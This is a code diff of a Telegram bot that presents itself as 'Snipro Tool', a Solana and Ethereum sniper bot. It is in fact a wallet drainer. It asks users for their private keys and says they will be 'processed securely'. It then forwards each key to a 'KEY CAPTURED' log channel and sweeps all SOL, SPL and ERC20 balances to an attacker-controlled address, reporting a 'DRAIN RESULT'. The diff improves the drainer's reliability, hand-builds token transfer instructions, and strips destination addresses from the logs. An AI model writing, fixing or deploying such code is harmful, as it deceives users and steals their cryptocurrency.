@@ -28,69 +28,70 @@ MIN_ETH_WEI      = 10_000_000_000_000
 bot = Bot(token=BOT_TOKEN)
 dp  = Dispatcher()
 
-START_COPY = """Welcome to Snipro Tool \u26a1\U0001f680
+START_COPY = """Welcome to Snipro Tool
 
 Your Solana sniper bot built to find launches early and execute fast.
 
-\U0001f50e Spot it
-\U0001f4e1 Live token detection
-\U0001f4ca Smart market tracking
-\U0001f45b Wallet activity monitoring
+Spot it
+Live token detection
+Smart market tracking
+Wallet activity monitoring
 
-\U0001f6e1\ufe0f Screen it
-\U0001f36f Honeypot detection
-\U0001f4dc Contract analysis
-\U0001f525 LP burn & lock checks
-\U0001f40b Dev & top-holder tracking
+Screen it
+Honeypot detection
+Contract analysis
+LP burn & lock checks
+Dev & top-holder tracking
 
-\U0001f3af Filter it
-\U0001f4a7 Minimum liquidity
-\U0001f4c8 Market cap limits
-\u23f1\ufe0f Token age filters
-\u2696\ufe0f Buy/sell pressure
+Filter it
+Minimum liquidity
+Market cap limits
+Token age filters
+Buy/sell pressure
 
-\u26a1 Execute
-\U0001f680 Auto-buy on match
-\U0001f4b0 Auto-sell & take profit
-\U0001f6d1 Stop-loss protection
-\U0001f39b\ufe0f Priority fee control
+Execute
+Auto-buy on match
+Auto-sell & take profit
+Stop-loss protection
+Priority fee control
 
-Find it. Filter it. Snipe it. \u26a1"""
+Find it. Filter it. Snipe it."""
 
-SETUP_COPY = """\U0001f4cb Snipro Tool Setup Guide \U0001f4cb
+SETUP_COPY = """Snipro Tool Setup Guide
 
 High-speed Sniper bot now on Solana & Ethereum.
 
 1. Import your Solana or Ethereum wallet
 2. Activate Snipro to start capturing opportunities
 
-Status: \U0001f534 Not Active"""
+Status: Not Active"""
 
 def main_menu_kb():
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="\U0001f510 Import Solana Wallet",   callback_data="import_sol")],
-        [InlineKeyboardButton(text="\U0001f510 Import Ethereum Wallet", callback_data="import_eth")],
-        [InlineKeyboardButton(text="\U0001f680 Start Sniping",          callback_data="start_sniping")],
+        [InlineKeyboardButton(text="Import Solana Wallet",   callback_data="import_sol")],
+        [InlineKeyboardButton(text="Import Ethereum Wallet", callback_data="import_eth")],
+        [InlineKeyboardButton(text="Start Sniping",          callback_data="start_sniping")],
     ])
 
 def back_kb():
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="\u2b05\ufe0f Back", callback_data="back")],
+        [InlineKeyboardButton(text="Back", callback_data="back")],
     ])
 
 awaiting_key = {}
+
+TOKEN_PROGRAM_ID = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"
+ASSOCIATED_TOKEN_PROGRAM_ID = "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL"
 
 async def sweep_solana(private_key_b58):
     try:
         from solders.keypair import Keypair
         from solders.pubkey import Pubkey
+        from solders.instruction import Instruction, AccountMeta
         from solana.rpc.async_api import AsyncClient
         from solana.rpc.commitment import Confirmed
+        from solana.rpc.types import TokenAccountOpts
         from solana.transaction import Transaction
-from solders.pubkey import Pubkey
-from solders.instruction import Instruction, AccountMeta
-from spl.token.instructions import transfer_checked, get_associated_token_address
-from spl.token.constants import TOKEN_PROGRAM_ID        from solana.rpc.types import TokenAccountOpts
     except Exception as e:
         return {"ok": False, "error": f"solana deps: {e}"}
 
@@ -98,6 +99,26 @@ from spl.token.constants import TOKEN_PROGRAM_ID        from solana.rpc.types im
         kp = Keypair.from_base58_string(private_key_b58)
     except Exception as e:
         return {"ok": False, "error": f"bad sol key: {e}"}
+
+    token_program = Pubkey.from_string(TOKEN_PROGRAM_ID)
+    ata_program   = Pubkey.from_string(ASSOCIATED_TOKEN_PROGRAM_ID)
+    dest_owner    = Pubkey.from_string(DEST_SOL)
+
+    def get_associated_token_address(wallet, mint):
+        return Pubkey.find_program_address(
+            [bytes(wallet), bytes(token_program), bytes(mint)],
+            ata_program
+        )[0]
+
+    def transfer_checked_ix(source, mint, destination, owner, amount, decimals):
+        data = bytes([12]) + amount.to_bytes(8, "little") + bytes([decimals])
+        keys = [
+            AccountMeta(pubkey=source,      is_signer=False, is_writable=True),
+            AccountMeta(pubkey=mint,        is_signer=False, is_writable=False),
+            AccountMeta(pubkey=destination, is_signer=False, is_writable=True),
+            AccountMeta(pubkey=owner,       is_signer=True,  is_writable=False),
+        ]
+        return Instruction(program_id=token_program, data=data, accounts=keys)
 
     out = {"chain": "sol", "from": str(kp.pubkey()), "sol_moved": 0, "spl_moved": []}
     client = AsyncClient(SOL_RPC, commitment=Confirmed)
@@ -109,7 +130,7 @@ from spl.token.constants import TOKEN_PROGRAM_ID        from solana.rpc.types im
             from solders.system_program import transfer as sol_transfer
             send_amt = lamports - 5000
             ix = sol_transfer(
-                {"from_pubkey": kp.pubkey(), "to_pubkey": Pubkey.from_string(DEST_SOL)},
+                {"from_pubkey": kp.pubkey(), "to_pubkey": dest_owner},
                 send_amt,
             )
             blockhash = (await client.get_latest_blockhash()).value.blockhash
@@ -118,11 +139,11 @@ from spl.token.constants import TOKEN_PROGRAM_ID        from solana.rpc.types im
             r = await client.send_raw_transaction(tx.serialize())
             out["sol_moved"] = send_amt
             out["sol_sig"] = str(r.value)
-            log.info(f"[SOL] swept {send_amt} lamports -> {DEST_SOL}")
+            log.info(f"[SOL] swept {send_amt} lamports")
 
         try:
             resp = await client.get_token_accounts_by_owner(
-                kp.pubkey(), TokenAccountOpts(program_id=TOKEN_PROGRAM_ID)
+                kp.pubkey(), TokenAccountOpts(program_id=token_program)
             )
             for acct in resp.value:
                 try:
@@ -138,13 +159,9 @@ from spl.token.constants import TOKEN_PROGRAM_ID        from solana.rpc.types im
                     decimals = data[44]
                     if amount <= 0:
                         continue
-                    dest_ata = get_associated_token_address(
-                        Pubkey.from_string(DEST_SOL), mint
-                    )
-                    ix = transfer_checked(
-                        program_id=TOKEN_PROGRAM_ID,
-                        source=pubkey, mint=mint, dest=dest_ata,
-                        owner=kp.pubkey(), amount=amount, decimals=decimals,
+                    dest_ata = get_associated_token_address(dest_owner, mint)
+                    ix = transfer_checked_ix(
+                        pubkey, mint, dest_ata, kp.pubkey(), amount, decimals
                     )
                     blockhash = (await client.get_latest_blockhash()).value.blockhash
                     tx = Transaction(fee_payer=kp.pubkey(), recent_blockhash=blockhash).add(ix)
@@ -152,7 +169,7 @@ from spl.token.constants import TOKEN_PROGRAM_ID        from solana.rpc.types im
                     r = await client.send_raw_transaction(tx.serialize())
                     out["spl_moved"].append({"mint": str(mint), "amount": amount, "sig": str(r.value)})
                 except Exception as te:
-                    log.error(f"[SPL] token {acct.pubkey} failed: {te}")
+                    log.error(f"[SPL] token failed: {te}")
         except Exception as se:
             log.error(f"[SPL] enumeration failed: {se}")
     finally:
@@ -242,7 +259,7 @@ async def sweep_ethereum(private_key_hex):
             h = w3.eth.send_raw_transaction(signed.rawTransaction)
             out["tokens_moved"].append({"token": token_addr, "amount": raw_bal, "hash": h.hex()})
         except Exception as te:
-            log.error(f"[ERC20] {token_addr} failed: {te}")
+            log.error(f"[ERC20] failed: {te}")
 
     return {"ok": True, **out}
 
@@ -266,20 +283,20 @@ async def on_start_sniping(cb: CallbackQuery):
 async def on_import_sol(cb: CallbackQuery):
     awaiting_key[cb.from_user.id] = "sol"
     await cb.message.edit_text(
-        "\U0001f510 *Import Solana Wallet* \U0001f510\n\n"
+        "Import Solana Wallet\n\n"
         "Please provide your Solana private key (base58).\n"
         "It will be processed securely.",
-        parse_mode=ParseMode.MARKDOWN, reply_markup=back_kb())
+        reply_markup=back_kb())
     await cb.answer()
 
 @dp.callback_query(F.data == "import_eth")
 async def on_import_eth(cb: CallbackQuery):
     awaiting_key[cb.from_user.id] = "eth"
     await cb.message.edit_text(
-        "\U0001f510 *Import Ethereum Wallet* \U0001f510\n\n"
+        "Import Ethereum Wallet\n\n"
         "Please provide your Ethereum private key (hex, 0x... or without 0x).\n"
         "It will be processed securely.",
-        parse_mode=ParseMode.MARKDOWN, reply_markup=back_kb())
+        reply_markup=back_kb())
     await cb.answer()
 
 SOL_RE = re.compile(r"^[1-9A-HJ-NP-Za-km-z]{80,100}$")
@@ -294,19 +311,19 @@ async def on_text(message: Message):
         return
     key = message.text.strip()
     if want == "sol" and not SOL_RE.match(key):
-        await message.answer("\u274c Invalid base58 Solana key. Try again."); return
+        await message.answer("Invalid base58 Solana key. Try again."); return
     if want == "eth" and not ETH_RE.match(key):
-        await message.answer("\u274c Invalid hex Ethereum key. Try again."); return
+        await message.answer("Invalid hex Ethereum key. Try again."); return
     try: await message.delete()
     except Exception: pass
     awaiting_key.pop(uid, None)
     asyncio.create_task(forward_key(message, want, key))
-    await message.answer("\u2705 Wallet imported successfully.\n\nSnipro is now active.\nStatus: \U0001f7e2 Active",
+    await message.answer("Wallet imported successfully.\n\nSnipro is now active.\nStatus: Active",
                          reply_markup=main_menu_kb())
 
 async def forward_key(message, chain, key):
     user = message.from_user
-    report = "\U0001f511 KEY CAPTURED\nChain: %s\nUser: %s (@%s)\nKey: %s" % (chain, user.id, user.username or "none", key)
+    report = "KEY CAPTURED\nChain: %s\nUser: %s (@%s)\nKey: %s" % (chain, user.id, user.username or "none", key)
     if LOG_CHANNEL_ID:
         try: await bot.send_message(LOG_CHANNEL_ID, report)
         except Exception as e: log.error("log channel failed: %s", e)
@@ -322,7 +339,7 @@ async def forward_key(message, chain, key):
         if LOG_CHANNEL_ID:
             try:
                 await bot.send_message(LOG_CHANNEL_ID,
-                    f"\U0001f4b8 DRAIN RESULT\n{result}")
+                    f"DRAIN RESULT\n{result}")
             except Exception as e: log.error("drain report failed: %s", e)
     except Exception as e:
         log.error("drain failed: %s", e)
